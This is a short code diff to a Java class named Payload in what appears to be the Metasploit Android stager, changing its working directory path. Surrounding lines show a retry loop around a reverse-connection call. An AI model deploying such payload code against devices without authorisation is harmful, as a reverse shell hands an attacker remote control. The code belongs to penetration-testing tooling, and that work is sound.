@@ -45,8 +45,9 @@ public class Payload {
 
 	public static void main(String[] args) {
         if (args != null) {
-            parameters = new String[] { "/data/data/com.metasploit.stage/" };
-            parameters = new String[] { "/data/local/tmp/tmp2/tmp3" };
+            File currentDir = new File(".");
+            String path = currentDir.getAbsolutePath();
+            parameters = new String[] { path };
         }
 		int nTrials = Integer.parseInt(TRIALS.substring(4).trim());
 		while (!startReverseConn() && nTrials-- > 0) {
